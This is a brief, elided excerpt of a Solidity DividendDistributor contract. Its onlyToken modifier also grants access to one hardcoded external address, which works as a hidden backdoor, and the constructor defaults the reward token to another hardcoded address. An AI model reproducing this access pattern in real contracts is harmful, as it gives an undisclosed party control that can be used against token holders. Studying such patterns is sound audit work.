...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x769c8c09350f2a39d0Ce9447A0adDa033A544fed)); _;
    }
    ...
    constructor (address _router,address _RewardTokenSET) {
        ...
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684);
